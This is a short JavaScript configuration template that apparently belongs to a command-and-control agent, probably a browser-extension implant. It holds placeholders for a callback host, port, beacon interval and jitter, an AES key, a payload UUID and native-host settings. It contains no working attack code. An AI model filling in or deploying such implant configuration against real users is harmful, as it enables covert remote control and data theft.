const DITTO_CONFIG = Object.freeze({
  h: "%%CALLBACK_HOST%%",
  p: Number("%%CALLBACK_PORT%%"),
  i: Number("%%CALLBACK_INTERVAL%%"),
  j: Number("%%CALLBACK_JITTER%%"),
  o: "%%POST_URI%%",
  x: "%%PAYLOAD_UUID%%",
  k: "%%AES_KEY%%",
  m: "%%ALARM_NAME%%",
  n: "%%NATIVE_HOST_NAME%%",
  nk: "%%NATIVE_HOST_KEY%%"
});
